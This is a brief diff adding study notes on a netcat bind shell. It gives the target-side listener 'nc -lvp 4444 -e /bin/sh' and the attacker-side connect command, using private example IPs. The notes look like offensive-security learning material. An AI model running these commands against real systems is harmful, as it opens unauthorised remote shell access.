@@ -1,0 +1,17 @@
+Netcat bind shell
+
+Attackbox
+192.168.1.1
+
+nc 192.168.1.2 4444
+
+Connecting
+
+Target
+192.168.1.2
+
+nc -lvp 4444 -e /bin/sh
+
+Listening
+
+Opposite of reverse shell
